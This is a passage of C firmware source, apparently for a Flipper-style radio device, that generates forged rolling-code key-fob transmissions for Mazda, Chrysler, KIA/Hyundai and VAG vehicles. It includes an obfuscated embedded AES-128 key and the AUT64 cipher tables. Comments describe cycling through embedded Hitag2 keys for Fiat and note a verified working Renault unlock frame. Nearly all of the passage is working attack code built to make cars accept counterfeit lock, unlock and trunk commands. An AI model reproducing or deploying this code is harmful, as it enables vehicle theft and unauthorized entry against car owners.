        if(!mazda_v0_enc_append_byte(up, cap, &index, air)) {
            return 0U;
        }
    }

    if(!mazda_v0_enc_append_byte(up, cap, &index, MAZDA_V0_ENC_TAIL_BYTE)) {
        return 0U;
    }

    if(!mazda_v0_enc_add_level(up, cap, &index, false, MAZDA_V0_ENC_GAP_US)) {
        return 0U;
    }

    return index;
}

static const bool mazda_v0_enc_is_fsk = false; /* AM primary (protocol also supports FM) */

static size_t mazda_v0_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0U;
    uint16_t bits = 0U;
    if(!mazda_v0_enc_build(serial, btn, cnt, &data, &bits)) {
        return 0U;
    }
    return mazda_v0_enc_upload(data, bits, up, cap);
}

/* ===========================================================================
 * CHRYSLER V0  --  ProtoPirate encoder (GPLv3)
 *   AM / OOK, two 80-bit payloads (A/B) per transmission.
 *
 *   *** LIMITATION ***  The source encoder does NOT synthesize a frame from
 *   serial/btn/cnt: it re-uses captured 9-byte plaintext blocks (Plain_A /
 *   Plain_B, or blocks derived from a captured key+key2) and only rolls the
 *   6-bit counter. Those plaintext blocks carry per-vehicle data that CANNOT be
 *   derived from serial/btn/cnt alone, so chrysler_v0_enc_build() returns false
 *   and reports it. The real waveform builder IS ported and usable via
 *   chrysler_v0_enc_prepare() + chrysler_v0_enc_upload() when captured plaintext
 *   is supplied.
 * ===========================================================================*/

#define CHRYSLER_V0_ENC_TE_SHORT        0x12CU
#define CHRYSLER_V0_ENC_TE_LONG_A       0xD48U
#define CHRYSLER_V0_ENC_TE_LONG_B       0xE74U
#define CHRYSLER_V0_ENC_TE_ONE_SHORT    0x258U
#define CHRYSLER_V0_ENC_FRAME_GAP       0x3CF0U
#define CHRYSLER_V0_ENC_PREAMBLE_PAIRS  24U
#define CHRYSLER_V0_ENC_BIT_COUNT       80U
#define CHRYSLER_V0_ENC_UPLOAD_CAPACITY 0x200U /* 512 */

static const uint8_t chrysler_v0_enc_xor_table[16] = {
    0x0F, 0x02, 0x40, 0x0C, 0x30, 0x0E, 0x70, 0x08,
    0x10, 0x0A, 0x50, 0xF4, 0x2F, 0xF6, 0x6F, 0xF0,
};

/* Two 10-byte on-air payloads populated by chrysler_v0_enc_prepare and emitted
 * by chrysler_v0_enc_upload (the transmission carries two 80-bit frames). */
static uint8_t chrysler_v0_enc_payload_a[10];
static uint8_t chrysler_v0_enc_payload_b[10];

static uint8_t chrysler_v0_enc_reverse6(uint32_t value) {
    uint8_t out = 0;
    uint8_t bits = 6;
    while(bits--) {
        out = (uint8_t)((out << 1U) | (value & 1U));
        value >>= 1U;
    }
    return out;
}

static void chrysler_v0_enc_transform_block(
    const uint8_t in[9],
    uint8_t out[9],
    uint32_t key,
    uint8_t button) {
    uint8_t mask = chrysler_v0_enc_xor_table[key & 0x0FU];
    if(button == 1U) {
        mask ^= (key & 1U) ? 0xF0U : 0x0FU;
    }
    for(size_t i = 0; i < 9; i++) {
        out[i] = in[i] ^ mask;
    }
}

static uint8_t chrysler_v0_enc_payload_get_bit(const uint8_t payload[10], uint8_t index) {
    const uint8_t byte = payload[index >> 3U];
    const uint8_t shift = 7U - (index & 7U);
    return (byte >> shift) & 1U;
}

static void chrysler_v0_enc_build_payload(
    const uint8_t plain[9],
    uint8_t counter,
    uint8_t button,
    uint8_t header_low2,
    uint8_t out[10]) {
    uint8_t transformed[9];
    chrysler_v0_enc_transform_block(plain, transformed, counter, button);
    out[0] = (uint8_t)((chrysler_v0_enc_reverse6(counter) << 2U) | (header_low2 & 0x03U));
    memcpy(&out[1], transformed, sizeof(transformed));
}

/* Required signature. Cannot reconstruct without captured plaintext blocks:
 * returns false. Use chrysler_v0_enc_prepare() instead when plaintext is known. */
static bool chrysler_v0_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    (void)serial;
    (void)btn;
    (void)cnt;
    if(out_data) {
        *out_data = 0U;
    }
    if(out_bits) {
        *out_bits = 0U;
    }
    return false; /* needs captured Plain_A/Plain_B (per-vehicle plaintext) */
}

/* Bonus builder usable with captured plaintext. plain_a/plain_b are the 9-byte
 * decoded blocks; header_low2 is the 2-bit frame header; counter is the 6-bit
 * rolling value to transmit. Fills the two static payloads and returns true. */
static bool chrysler_v0_enc_prepare(
    const uint8_t plain_a[9],
    const uint8_t plain_b[9],
    uint8_t header_low2,
    uint8_t button,
    uint8_t counter) {
    if(!plain_a || !plain_b) {
        return false;
    }
    if(button != 1U && button != 2U) {
        return false;
    }

    uint8_t counter_a = (uint8_t)(counter & 0x3FU);
    if(counter_a & 1U) {
        counter_a = (uint8_t)((counter_a - 1U) & 0x3FU);
    }
    const uint8_t counter_b = (counter_a == 0U) ? 0x3FU : (uint8_t)(counter_a - 1U);

    chrysler_v0_enc_build_payload(
        plain_a, counter_a, button, header_low2, chrysler_v0_enc_payload_a);
    chrysler_v0_enc_build_payload(
        plain_b, counter_b, button, header_low2, chrysler_v0_enc_payload_b);
    return true;
}

/* Emit the dual-frame waveform from the two static payloads. data/bits are
 * accepted for signature conformance but the >64-bit dual payload is read from
 * the static buffers populated by chrysler_v0_enc_prepare. */
static size_t chrysler_v0_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)data;
    (void)bits;
    if(!up) {
        return 0U;
    }
    const uint8_t* payload_a = chrysler_v0_enc_payload_a;
    const uint8_t* payload_b = chrysler_v0_enc_payload_b;
    size_t i = 0;

    for(size_t preamble = 0; preamble < CHRYSLER_V0_ENC_PREAMBLE_PAIRS; preamble++) {
        i = pp_emit(up, i, cap, true, CHRYSLER_V0_ENC_TE_SHORT);
        i = pp_emit(up, i, cap, false, CHRYSLER_V0_ENC_TE_LONG_B);
    }

    i = pp_emit(up, i, cap, true, CHRYSLER_V0_ENC_TE_SHORT);
    i = pp_emit(up, i, cap, false, CHRYSLER_V0_ENC_FRAME_GAP);

    for(uint8_t bit = 0; bit < CHRYSLER_V0_ENC_BIT_COUNT; bit++) {
        const bool value = chrysler_v0_enc_payload_get_bit(payload_a, bit);
        i = pp_emit(
            up, i, cap, true, value ? CHRYSLER_V0_ENC_TE_ONE_SHORT : CHRYSLER_V0_ENC_TE_SHORT);
        i = pp_emit(
            up, i, cap, false, value ? CHRYSLER_V0_ENC_TE_LONG_A : CHRYSLER_V0_ENC_TE_LONG_B);
    }

    i = pp_emit(up, i, cap, true, CHRYSLER_V0_ENC_TE_SHORT);
    i = pp_emit(up, i, cap, false, CHRYSLER_V0_ENC_FRAME_GAP);

    for(size_t preamble = 0; preamble < CHRYSLER_V0_ENC_PREAMBLE_PAIRS; preamble++) {
        i = pp_emit(up, i, cap, true, CHRYSLER_V0_ENC_TE_SHORT);
        i = pp_emit(up, i, cap, false, CHRYSLER_V0_ENC_TE_LONG_B);
    }

    i = pp_emit(up, i, cap, true, CHRYSLER_V0_ENC_TE_SHORT);
    i = pp_emit(up, i, cap, false, CHRYSLER_V0_ENC_FRAME_GAP);

    for(uint8_t bit = 0; bit < CHRYSLER_V0_ENC_BIT_COUNT; bit++) {
        const bool value = chrysler_v0_enc_payload_get_bit(payload_b, bit);
        i = pp_emit(
            up, i, cap, true, value ? CHRYSLER_V0_ENC_TE_ONE_SHORT : CHRYSLER_V0_ENC_TE_SHORT);
        i = pp_emit(
            up, i, cap, false, value ? CHRYSLER_V0_ENC_TE_LONG_A : CHRYSLER_V0_ENC_TE_LONG_B);
    }

    i = pp_emit(up, i, cap, true, CHRYSLER_V0_ENC_TE_SHORT);
    i = pp_emit(up, i, cap, false, CHRYSLER_V0_ENC_FRAME_GAP);

    return (i <= cap) ? i : 0U;
}

static const bool chrysler_v0_enc_is_fsk = false; /* AM / OOK */

/* Required entry point. Build fails (needs captured plaintext) => returns 0.
 * For a working transmit, call chrysler_v0_enc_prepare() then
 * chrysler_v0_enc_upload() directly. */
static size_t chrysler_v0_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0U;
    uint16_t bits = 0U;
    if(!chrysler_v0_enc_build(serial, btn, cnt, &data, &bits)) {
        return 0U;
    }
    return chrysler_v0_enc_upload(data, bits, up, cap);
}

/* ===========================================================================
 * SUMMARY  --  ProtoPirate encoder (GPLv3)
 *
 *   fiat_v1
 *     next    : fiat_v1_enc_next
 *     is_fsk  : false (AM / OOK)
 *     cap     : FIAT_V1_ENC_UPLOAD_CAPACITY = 240
 *     limit   : rolling code is a Hitag2-BCM authenticator keyed by the
 *               vehicle's secret. Built from the EMBEDDED known-key table
 *               (index FIAT_V1_ENC_DEFAULT_KEY_IDX = 0), so it emits a
 *               structurally valid 104-bit frame WITHOUT an external key file,
 *               but the car accepts it only if its Hitag2 key == the selected
 *               embedded key. Change FIAT_V1_ENC_DEFAULT_KEY_IDX to try others.
 *               The 104-bit wire frame exceeds uint64, so it is carried in the
 *               static fiat_v1_enc_raw[] between build and upload.
 *
 *   renault_v0
 *     next    : renault_v0_enc_next
 *     is_fsk  : false (AM / OOK, 315/433/868)
 *     cap     : RENAULT_V0_ENC_UPLOAD_CAPACITY = 600
 *     limit   : fully self-contained (embedded parity matrix, no secret key).
 *               Valid buttons only: 0x05 (Trunk), 0x06 (Lock), 0x0A (Unlock);
 *               counter is 8-bit. 82-bit frame = 64-bit data (passed) + 18-bit
 *               key2 (static renault_v0_enc_key2 between build and upload).
 *               build() succeeds ONLY when the embedded parity model reproduces
 *               a type-13-valid frame for that (serial,button,counter) -- i.e.
 *               the source's `rolling` condition (the XOR checksum is serial-
 *               sensitive). It returns false otherwise; in that case the source
 *               falls back to replaying the captured frame verbatim. Verified:
 *               e.g. serial 0x000082 btn 0x0A cnt 0 builds and yields 504 pulses.
 *
 *   mazda_v0
 *     next    : mazda_v0_enc_next
 *     is_fsk  : false (AM primary; protocol flags also list FM)
 *     cap     : MAZDA_V0_ENC_UPLOAD_CAPACITY = 386
 *     limit   : fully self-contained (checksum + bit-shuffle, no secret key).
 *               64-bit key fits in the uint64 data word; button masked to 4
 *               bits, counter masked to 20 bits.
 *
 *   chrysler_v0
 *     next    : chrysler_v0_enc_next  (returns 0 -- see below)
 *     is_fsk  : false (AM / OOK)
 *     cap     : CHRYSLER_V0_ENC_UPLOAD_CAPACITY = 512
 *     limit   : the waveform builder IS ported and usable, BUT reconstruction
 *               from serial/btn/cnt is impossible: the source rolls only the
 *               6-bit counter over captured per-vehicle 9-byte plaintext blocks
 *               (Plain_A/Plain_B), which are not derivable from serial/btn/cnt.
 *               chrysler_v0_enc_build() therefore returns false and
 *               chrysler_v0_enc_next() returns 0. Supply captured plaintext via
 *               chrysler_v0_enc_prepare() then call chrysler_v0_enc_upload()
 *               for a working transmit.
 *
 *   (all four protocols HAVE a real pp_emit-based waveform builder in source;
 *    none were skipped for "no encoder".)
 * ===========================================================================*/


// --- pp_enc_arf_kia6vag.h ---
/* ======================================================================
 * pp_enc_arf_kia6vag.h
 * Flipper-ARF encoder (GPL, embedded key)
 *
 * Self-contained ENCODER (next-rolling-code TX) path for two car-key
 * protocols ported from Flipper-ARF:
 *   - KIA/HYU V6   (AES-128 encrypt, embedded key)
 *   - VAG GROUP    (AUT64 + TEA encrypt, embedded packed keys)
 *
 * COLLISION SAFETY
 * ----------------
 * The firmware already carries the DECODER side of both protocols, with
 * its own AES tables/key (kia_v6_aes_*), the AUT64 cipher (aut64_decrypt,
 * aut64_unpack, `struct aut64_key`, its boxes), `vag_keys_packed` and each
 * protocol's `<p>_const`/#defines. To avoid ANY redefinition, EVERYTHING
 * emitted here is a PRIVATE copy carrying a `<p>_enc_` prefix: every static,
 * struct and macro. Nothing below references a bare aut64_* / aes_* /
 * vag_keys_packed symbol.
 *
 * Depends only on the encoder SHIM already provided by the including TU
 * (do NOT redefine): LevelDuration, level_duration_make,
 * subghz_protocol_blocks_crc8, and standard bool/size_t/memset/memcpy/NULL.
 *
 * No #include / no #pragma once (fragment).
 * ====================================================================== */

/* ======================================================================
 * ===============================  KIA V6  =============================
 * AES-128 encrypt path, embedded key. FSK (source flag SubGhzProtocolFlag_FM).
 * ====================================================================== */

#define KIA_V6_ENC_XOR_MASK_LOW      0x84AF25FB
#define KIA_V6_ENC_XOR_MASK_HIGH     0x638766AB
#define KIA_V6_ENC_TE_SHORT          200u
#define KIA_V6_ENC_TE_LONG           400u
#define KIA_V6_ENC_PREAMBLE_PAIRS_1  640
#define KIA_V6_ENC_PREAMBLE_PAIRS_2  38
#define kia_v6_enc_crc8(data, len)   subghz_protocol_blocks_crc8((data), (len), 0x07, 0xFF)

static const uint8_t kia_v6_enc_aes_sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab,
    0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4,
    0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71,
    0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2,
    0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6,
    0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb,
    0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45,
    0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44,
    0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a,
    0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49,
    0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d,
    0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25,
    0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e,
    0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1,
    0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb,
    0x16};

static const uint8_t kia_v6_enc_aes_rcon[10] =
    {0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36};

static uint8_t kia_v6_enc_gf_mul2(uint8_t x) {
    return ((x >> 7) * 0x1b) ^ (x << 1);
}

static void kia_v6_enc_aes_addroundkey(uint8_t* state, const uint8_t* round_key) {
    for(int col = 0; col < 4; col++) {
        state[col * 4] ^= round_key[col * 4];
        state[col * 4 + 1] ^= round_key[col * 4 + 1];
        state[col * 4 + 2] ^= round_key[col * 4 + 2];
        state[col * 4 + 3] ^= round_key[col * 4 + 3];
    }
}

static void kia_v6_enc_aes_subbytes(uint8_t* state) {
    for(int row = 0; row < 4; row++) {
        for(int col = 0; col < 4; col++) {
            state[row + col * 4] = kia_v6_enc_aes_sbox[state[row + col * 4]];
        }
    }
}

static void kia_v6_enc_aes_shiftrows(uint8_t* state) {
    uint8_t temp;
    temp = state[1];
    state[1] = state[5];
    state[5] = state[9];
    state[9] = state[13];
    state[13] = temp;
    temp = state[2];
    state[2] = state[10];
    state[10] = temp;
    temp = state[6];
    state[6] = state[14];
    state[14] = temp;
    temp = state[3];
    state[3] = state[15];
    state[15] = state[11];
    state[11] = state[7];
    state[7] = temp;
}

static void kia_v6_enc_aes_mixcolumns(uint8_t* state) {
    uint8_t a, b, c, d;
    for(int i = 0; i < 4; i++) {
        a = state[i * 4];
        b = state[i * 4 + 1];
        c = state[i * 4 + 2];
        d = state[i * 4 + 3];
        state[i * 4] = kia_v6_enc_gf_mul2(a) ^ kia_v6_enc_gf_mul2(b) ^ b ^ c ^ d;
        state[i * 4 + 1] = a ^ kia_v6_enc_gf_mul2(b) ^ kia_v6_enc_gf_mul2(c) ^ c ^ d;
        state[i * 4 + 2] = a ^ b ^ kia_v6_enc_gf_mul2(c) ^ kia_v6_enc_gf_mul2(d) ^ d;
        state[i * 4 + 3] = kia_v6_enc_gf_mul2(a) ^ a ^ b ^ c ^ kia_v6_enc_gf_mul2(d);
    }
}

static void kia_v6_enc_aes128_encrypt(const uint8_t* expanded_key, uint8_t* data) {
    uint8_t state[16];
    memcpy(state, data, 16);
    kia_v6_enc_aes_addroundkey(state, &expanded_key[0]);
    for(int round = 1; round < 10; round++) {
        kia_v6_enc_aes_subbytes(state);
        kia_v6_enc_aes_shiftrows(state);
        kia_v6_enc_aes_mixcolumns(state);
        kia_v6_enc_aes_addroundkey(state, &expanded_key[round * 16]);
    }
    kia_v6_enc_aes_subbytes(state);
    kia_v6_enc_aes_shiftrows(state);
    kia_v6_enc_aes_addroundkey(state, &expanded_key[160]);
    memcpy(data, state, 16);
}

static void kia_v6_enc_aes_key_expansion(const uint8_t* key, uint8_t* round_keys) {
    for(int i = 0; i < 16; i++) {
        round_keys[i] = key[i];
    }
    for(int i = 4; i < 44; i++) {
        int prev_word_idx = (i - 1) * 4;
        uint8_t b0 = round_keys[prev_word_idx];
        uint8_t b1 = round_keys[prev_word_idx + 1];
        uint8_t b2 = round_keys[prev_word_idx + 2];
        uint8_t b3 = round_keys[prev_word_idx + 3];

        if((i % 4) == 0) {
            uint8_t new_b0 = kia_v6_enc_aes_sbox[b1] ^ kia_v6_enc_aes_rcon[(i / 4) - 1];
            uint8_t new_b1 = kia_v6_enc_aes_sbox[b2];
            uint8_t new_b2 = kia_v6_enc_aes_sbox[b3];
            uint8_t new_b3 = kia_v6_enc_aes_sbox[b0];
            b0 = new_b0;
            b1 = new_b1;
            b2 = new_b2;
            b3 = new_b3;
        }

        int back_word_idx = (i - 4) * 4;
        b0 ^= round_keys[back_word_idx];
        b1 ^= round_keys[back_word_idx + 1];
        b2 ^= round_keys[back_word_idx + 2];
        b3 ^= round_keys[back_word_idx + 3];

        int curr_word_idx = i * 4;
        round_keys[curr_word_idx] = b0;
        round_keys[curr_word_idx + 1] = b1;
        round_keys[curr_word_idx + 2] = b2;
        round_keys[curr_word_idx + 3] = b3;
    }
}

static void kia_v6_enc_get_aes_key(uint8_t* aes_key) {
    uint64_t keystore_a = 0x37CE21F8C9F862A8ULL ^ 0x5448455049524154ULL;
    uint32_t keystore_a_hi = (keystore_a >> 32) & 0xFFFFFFFF;
    uint32_t keystore_a_lo = keystore_a & 0xFFFFFFFF;

    uint32_t uVar15_a = keystore_a_lo ^ KIA_V6_ENC_XOR_MASK_LOW;
    uint32_t uVar5_a = KIA_V6_ENC_XOR_MASK_HIGH ^ keystore_a_hi;

    uint64_t val64_a = ((uint64_t)uVar5_a << 32) | uVar15_a;
    for(int i = 0; i < 8; i++) {
        aes_key[i] = (val64_a >> (56 - i * 8)) & 0xFF;
    }

    uint64_t keystore_b = 0x3FC629F0C1F06AA0ULL ^ 0x5448455049524154ULL;
    uint32_t keystore_b_hi = (keystore_b >> 32) & 0xFFFFFFFF;
    uint32_t keystore_b_lo = keystore_b & 0xFFFFFFFF;

    uint32_t uVar15_b = keystore_b_lo ^ KIA_V6_ENC_XOR_MASK_LOW;
    uint32_t uVar5_b = KIA_V6_ENC_XOR_MASK_HIGH ^ keystore_b_hi;

    uint64_t val64_b = ((uint64_t)uVar5_b << 32) | uVar15_b;
    for(int i = 0; i < 8; i++) {
        aes_key[i + 8] = (val64_b >> (56 - i * 8)) & 0xFF;
    }
}

static void kia_v6_enc_encrypt_payload(
    uint8_t fx_field,
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint32_t* out_part1_low,
    uint32_t* out_part1_high,
    uint32_t* out_part2_low,
    uint32_t* out_part2_high,
    uint16_t* out_part3) {
    uint8_t plain[16];
    memset(plain, 0, 16);
    plain[0] = fx_field;
    plain[4] = (serial >> 16) & 0xFF;
    plain[5] = (serial >> 8) & 0xFF;
    plain[6] = serial & 0xFF;
    plain[7] = btn & 0x0F;
    plain[8] = (cnt >> 24) & 0xFF;
    plain[9] = (cnt >> 16) & 0xFF;
    plain[10] = (cnt >> 8) & 0xFF;
    plain[11] = cnt & 0xFF;
    plain[12] = kia_v6_enc_aes_sbox[cnt & 0xFF];
    plain[15] = kia_v6_enc_crc8(plain, 15);

    uint8_t aes_key[16];
    kia_v6_enc_get_aes_key(aes_key);
    uint8_t expanded_key[176];
    kia_v6_enc_aes_key_expansion(aes_key, expanded_key);
    kia_v6_enc_aes128_encrypt(expanded_key, plain);

    uint8_t fx_hi = 0x20 | (fx_field >> 4);
    uint8_t fx_lo = fx_field & 0x0F;
    *out_part1_high = ((uint32_t)fx_hi << 24) | ((uint32_t)fx_lo << 16) |
                      ((uint32_t)plain[0] << 8) | plain[1];
    *out_part1_low = ((uint32_t)plain[2] << 24) | ((uint32_t)plain[3] << 16) |
                     ((uint32_t)plain[4] << 8) | plain[5];
    *out_part2_high = ((uint32_t)plain[6] << 24) | ((uint32_t)plain[7] << 16) |
                      ((uint32_t)plain[8] << 8) | plain[9];
    *out_part2_low = ((uint32_t)plain[10] << 24) | ((uint32_t)plain[11] << 16) |
                     ((uint32_t)plain[12] << 8) | plain[13];
    *out_part3 = ((uint16_t)plain[14] << 8) | plain[15];
}

static inline void
    kia_v6_enc_manch(LevelDuration* up, size_t* idx, bool bit, uint32_t te) {
    if(bit) {
        up[(*idx)++] = level_duration_make(false, te);
        up[(*idx)++] = level_duration_make(true, te);
    } else {
        up[(*idx)++] = level_duration_make(true, te);
        up[(*idx)++] = level_duration_make(false, te);
    }
}

static void kia_v6_enc_encode_message(
    LevelDuration* up,
    size_t* idx,
    int preamble_pairs,
    uint32_t p1_lo,
    uint32_t p1_hi,
    uint32_t p2_lo,
    uint32_t p2_hi,
    uint16_t p3) {
    const uint32_t te_short = KIA_V6_ENC_TE_SHORT;

    for(int i = 0; i < preamble_pairs; i++) {
        up[(*idx)++] = level_duration_make(true, te_short);
        up[(*idx)++] = level_duration_make(false, te_short);
    }
    up[(*idx)++] = level_duration_make(false, te_short);
    up[(*idx)++] = level_duration_make(true, KIA_V6_ENC_TE_LONG);
    up[(*idx)++] = level_duration_make(false, te_short);

    for(int b = 60; b >= 0; b--) {
        uint32_t word = (b >= 32) ? p1_hi : p1_lo;
        int shift = (b >= 32) ? (b - 32) : b;
        kia_v6_enc_manch(up, idx, ((~word) >> shift) & 1, te_short);
    }
    for(int b = 63; b >= 0; b--) {
        uint32_t word = (b >= 32) ? p2_hi : p2_lo;
        int shift = (b >= 32) ? (b - 32) : b;
        kia_v6_enc_manch(up, idx, ((~word) >> shift) & 1, te_short);
    }
    for(int b = 15; b >= 0; b--) {
        kia_v6_enc_manch(up, idx, ((~p3) >> b) & 1, te_short);
    }
}

/* Frame carry: the on-air frame is 144 bits, larger than one uint64_t.
 * <p>_enc_build returns part1 (fx + first AES bytes) as the 64-bit *out_data
 * word and stashes the remaining part2/part3 words in these module statics,
 * which <p>_enc_upload reads back (mirrors the renault-style carry). */
static uint32_t kia_v6_enc_frame_p2_lo = 0;
static uint32_t kia_v6_enc_frame_p2_hi = 0;
static uint16_t kia_v6_enc_frame_p3 = 0;

/* Fx field: not derivable from serial/btn/cnt alone. Captured frames carry
 * it; for fresh reconstruction it defaults to 0 (=> part1_high fx_hi 0x20,
 * fx_lo 0). Caller may override before calling <p>_enc_next if a captured Fx
 * is known. */
static uint8_t kia_v6_enc_fx = 0x00;

static bool kia_v6_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    uint32_t p1_lo, p1_hi, p2_lo, p2_hi;
    uint16_t p3;
    kia_v6_enc_encrypt_payload(
        kia_v6_enc_fx, serial, btn & 0x0F, cnt, &p1_lo, &p1_hi, &p2_lo, &p2_hi, &p3);

    kia_v6_enc_frame_p2_lo = p2_lo;
    kia_v6_enc_frame_p2_hi = p2_hi;
    kia_v6_enc_frame_p3 = p3;

    *out_data = ((uint64_t)p1_hi << 32) | p1_lo;
    *out_bits = 144;
    return true;
}

static size_t
    kia_v6_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;
    if(cap < 1980) return 0; /* worst-case built size ~1928 entries */

    uint32_t p1_lo = (uint32_t)data;
    uint32_t p1_hi = (uint32_t)(data >> 32);
    uint32_t p2_lo = kia_v6_enc_frame_p2_lo;
    uint32_t p2_hi = kia_v6_enc_frame_p2_hi;
    uint16_t p3 = kia_v6_enc_frame_p3;

    size_t index = 0;
    kia_v6_enc_encode_message(
        up, &index, KIA_V6_ENC_PREAMBLE_PAIRS_1, p1_lo, p1_hi, p2_lo, p2_hi, p3);
    up[index++] = level_duration_make(false, KIA_V6_ENC_TE_LONG);
    kia_v6_enc_encode_message(
        up, &index, KIA_V6_ENC_PREAMBLE_PAIRS_2, p1_lo, p1_hi, p2_lo, p2_hi, p3);
    up[index++] = level_duration_make(false, KIA_V6_ENC_TE_LONG);
    return index;
}

/* Source flag: SubGhzProtocolFlag_FM => FSK */
static const bool kia_v6_enc_is_fsk = true;

static size_t kia_v6_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data;
    uint16_t bits;
    if(!kia_v6_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return kia_v6_enc_upload(data, bits, up, cap);
}

/* ======================================================================
 * ================================  VAG  ==============================
 * AUT64 + TEA encrypt path, embedded packed keys. AM (SubGhzProtocolFlag_AM).
 * Private AUT64 cipher copy: `struct vag_enc_aut64_key`, boxes and routines
 * all `vag_enc_` prefixed so nothing collides with the decoder's aut64_*.
 * ====================================================================== */

#define VAG_ENC_AUT64_NUM_ROUNDS 12
#define VAG_ENC_AUT64_BLOCK_SIZE 8
#define VAG_ENC_AUT64_KEY_SIZE   8
#define VAG_ENC_AUT64_PBOX_SIZE  8
#define VAG_ENC_AUT64_SBOX_SIZE  16
#define VAG_ENC_AUT64_KEY_PACKED_SIZE 16
#define VAG_ENC_KEYS_COUNT       3

struct vag_enc_aut64_key {
    uint8_t index;
    uint8_t key[VAG_ENC_AUT64_KEY_SIZE];
    uint8_t pbox[VAG_ENC_AUT64_PBOX_SIZE];
    uint8_t sbox[VAG_ENC_AUT64_SBOX_SIZE];
};

static const uint8_t vag_enc_aut64_table_ln[VAG_ENC_AUT64_NUM_ROUNDS][8] = {
    {0x4, 0x5, 0x6, 0x7, 0x0, 0x1, 0x2, 0x3}, // Round 0
    {0x5, 0x4, 0x7, 0x6, 0x1, 0x0, 0x3, 0x2}, // Round 1
    {0x6, 0x7, 0x4, 0x5, 0x2, 0x3, 0x0, 0x1}, // Round 2
    {0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0}, // Round 3
    {0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7}, // Round 4
    {0x1, 0x0, 0x3, 0x2, 0x5, 0x4, 0x7, 0x6}, // Round 5
    {0x2, 0x3, 0x0, 0x1, 0x6, 0x7, 0x4, 0x5}, // Round 6
    {0x3, 0x2, 0x1, 0x0, 0x7, 0x6, 0x5, 0x4}, // Round 7
    {0x5, 0x4, 0x7, 0x6, 0x1, 0x0, 0x3, 0x2}, // Round 8
    {0x4, 0x5, 0x6, 0x7, 0x0, 0x1, 0x2, 0x3}, // Round 9
    {0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0}, // Round 10
    {0x6, 0x7, 0x4, 0x5, 0x2, 0x3, 0x0, 0x1}, // Round 11
};

static const uint8_t vag_enc_aut64_table_un[VAG_ENC_AUT64_NUM_ROUNDS][8] = {
    {0x1, 0x0, 0x3, 0x2, 0x5, 0x4, 0x7, 0x6}, // Round 0
    {0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7}, // Round 1
    {0x3, 0x2, 0x1, 0x0, 0x7, 0x6, 0x5, 0x4}, // Round 2
    {0x2, 0x3, 0x0, 0x1, 0x6, 0x7, 0x4, 0x5}, // Round 3
    {0x5, 0x4, 0x7, 0x6, 0x1, 0x0, 0x3, 0x2}, // Round 4
    {0x4, 0x5, 0x6, 0x7, 0x0, 0x1, 0x2, 0x3}, // Round 5
    {0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0}, // Round 6
    {0x6, 0x7, 0x4, 0x5, 0x2, 0x3, 0x0, 0x1}, // Round 7
